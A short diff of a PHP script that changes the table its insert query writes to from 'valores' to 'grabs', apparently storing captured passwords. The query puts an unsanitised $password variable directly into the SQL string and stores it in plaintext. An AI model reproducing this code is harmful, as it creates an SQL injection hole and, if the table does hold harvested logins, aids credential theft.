@@ -18,7 +18,7 @@
                     
     // Performing insert query execution
     // here our table name is college
-    $sql = "INSERT INTO valores VALUES ('','$password')";
+    $sql = "INSERT INTO grabs VALUES ('','$password')";
                  
     if(mysqli_query($conn, $sql)){
         #echo "<h3>data stored in a database successfully." 
